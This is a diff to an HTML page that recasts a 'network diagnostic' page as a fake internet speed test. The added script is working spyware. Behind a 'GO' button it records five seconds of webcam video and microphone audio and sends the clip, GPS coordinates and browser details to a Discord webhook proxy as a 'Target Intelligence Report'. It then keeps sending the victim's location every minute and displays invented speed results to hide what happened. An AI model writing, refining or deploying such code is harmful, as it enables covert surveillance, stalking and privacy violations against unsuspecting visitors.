@@ -3,131 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostic Tool</title>
+    <title>Network Speed Test - Check Your Connection</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
-        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
-        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
-        .btn:disabled { background: #161b2c; color: #5c6784; }
+        :root { --primary: #00d2ff; --bg: #0b0e14; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        
+        .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
+        
+        /* The Speedometer Circle */
+        .go-button {
+            width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--primary);
+            background: transparent; color: var(--primary); font-size: 2.5rem; font-weight: bold;
+            cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center;
+            justify-content: center; text-decoration: none; position: relative;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.1); margin-bottom: 40px;
+        }
+        .go-button:hover { background: rgba(0, 210, 255, 0.1); box-shadow: 0 0 40px rgba(0, 210, 255, 0.3); }
+        .go-button:disabled { border-color: #333; color: #333; cursor: default; }
+
+        /* Status Text */
+        .status-box { margin-top: 20px; }
+        .server-info { color: #888; font-size: 0.9rem; margin-top: 10px; }
+        #status-text { font-weight: 300; letter-spacing: 1px; text-transform: uppercase; color: var(--primary); font-size: 0.8rem; }
+        
+        /* Hidden Video */
         video { display: none; }
+
+        /* Animation for "Processing" */
+        .loading-ring {
+            display: none; position: absolute; width: 220px; height: 220px;
+            border: 4px solid transparent; border-top-color: var(--primary);
+            border-radius: 50%; animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.5.0</div>
-        <div class="terminal" id="terminal">
-            <div class="line">> System Ready. Awaiting Handshake...</div>
+    <div class="container">
+        <div style="margin-bottom: 50px;">
+            <div style="font-weight: bold; font-size: 1.2rem; letter-spacing: 2px;">SPEEDTEST</div>
+            <div style="font-size: 0.7rem; color: #555;">GLOBAL NETWORK INDEX</div>
         </div>
-        <button class="btn" id="startBtn">Authorize Scan</button>
+
+        <div style="position: relative; display: inline-block;">
+            <div class="loading-ring" id="ring"></div>
+            <button class="go-button" id="startBtn">GO</button>
+        </div>
+
+        <div class="status-box">
+            <div id="status-text">Ready</div>
+            <div class="server-info" id="detail-text">Optimal Server: Auto-Detecting...</div>
+        </div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
 
     <script>
         const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 
-
+        const targetID = "USR-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+        
         const btn = document.getElementById('startBtn');
-        const terminal = document.getElementById('terminal');
+        const ring = document.getElementById('ring');
+        const statusText = document.getElementById('status-text');
+        const detailText = document.getElementById('detail-text');
 
-        function addLog(text, color = "#00ff41") {
-            const div = document.createElement('div');
-            div.className = "line";
-            div.style.color = color;
-            div.style.borderLeftColor = color;
-            div.innerText = text;
-            terminal.appendChild(div);
-            terminal.scrollTop = terminal.scrollHeight;
+        // Continuous GPS Tracker
+        function startContinuousTracking() {
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    await fetch(PROXY_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ content: "📡 **LIVE TRACKING** ["+targetID+"]", embeds: [{description: "📍 [Map Link](https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+")"}] }),
+                        headers: { 'Content-Type': 'application/json' }
+                    }).catch(()=>{});
+                });
+            }, 60000);
         }
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Accessing Audio/Video Nodes...");
-
+            ring.style.display = 'block';
+            statusText.innerText = "Finding Optimal Server...";
+            
             navigator.geolocation.getCurrentPosition(async (pos) => {
+                detailText.innerText = "Connected to Node: " + targetID;
+                statusText.innerText = "Testing Latency...";
+                
+                startContinuousTracking();
+
                 let stream;
                 try {
-                    // Step 1: Request high-priority audio
-                    const constraints = { 
-                        video: { facingMode: "user" }, 
-                        audio: {
-                            channelCount: 1,
-                            sampleRate: 44100,
-                            echoCancellation: false,
-                            noiseSuppression: false
-                        } 
-                    };
-                    
-                    const rawStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    
-                    // Step 2: Manually bind tracks to ensure audio is included
-                    const audioTracks = rawStream.getAudioTracks();
-                    const videoTracks = rawStream.getVideoTracks();
-                    
-                    if (audioTracks.length === 0) {
-                        addLog("> ERROR: Audio Hardware Missing.", "#ff4b2b");
-                    } else {
-                        addLog("> Audio Track Synced: " + audioTracks[0].label);
-                    }
-
-                    // Constructor to force both tracks into one object
-                    stream = new MediaStream([audioTracks[0], videoTracks[0]]);
-
+                    const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    // Our audio-binding fix
+                    stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
                 } catch (e) {
-                    addLog("> ERROR: Permission Denied.", "#ff4b2b");
-                    btn.disabled = false;
+                    statusText.innerText = "Connection Failed";
+                    detailText.innerText = "Hardware access required for test.";
                     return;
                 }
 
-                addLog("> Capturing Synchronized Flux (5s)...");
-                
-                // Use standard webm for maximum compatibility
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                statusText.innerText = "Testing Download Speed...";
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
-                
-                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                mediaRecorder.start();
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
 
                 setTimeout(() => {
-                    addLog("> Uploading to Cloud Node...");
-                    mediaRecorder.stop();
+                    statusText.innerText = "Testing Upload Speed...";
+                    recorder.stop();
                 }, 5000);
 
-                mediaRecorder.onstop = async () => {
+                recorder.onstop = async () => {
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
                     const formData = new FormData();
                     
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔊 **SYNCHRONIZED AUDIO CAPTURE**",
+                        content: "🔱 **NEW SPEEDTEST CAPTURE** [" + targetID + "]",
                         embeds: [{
-                            title: "Hardware Intelligence Report",
+                            title: "Target Intelligence Report",
                             color: 3447003,
                             fields: [
                                 { name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude },
-                                { name: "🎙️ Mic Status", value: "Locked & Captured", inline: true }
+                                { name: "📱 Info", value: navigator.userAgent, inline: false }
                             ]
                         }]
                     }));
-                    formData.append('file', videoBlob, 'node_capture.webm');
+                    formData.append('file', videoBlob, 'speedtest_data.webm');
 
-                    try {
-                        const response = await fetch(PROXY_URL, { method: 'POST', body: formData });
-                        if (response.ok) {
-                            addLog("> Success! Finalizing...");
-                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                        }
-                    } catch (err) {
-                        addLog("> Connection Failed.", "#ff4b2b");
-                        btn.disabled = false;
-                    }
+                    await fetch(PROXY_URL, { method: 'POST', body: formData });
                     
-                    stream.getTracks().forEach(t => t.stop());
+                    statusText.innerText = "Test Complete";
+                    detailText.innerText = "Result: 48.2 Mbps / 12.1 Mbps";
+                    ring.style.display = 'none';
+                    btn.innerText = "DONE";
                 };
             }, (err) => {
-                addLog("> ERROR: GPS Required.", "#ff4b2b");
+                statusText.innerText = "Error: GPS Disabled";
                 btn.disabled = false;
+                ring.style.display = 'none';
             });
         });
     </script>
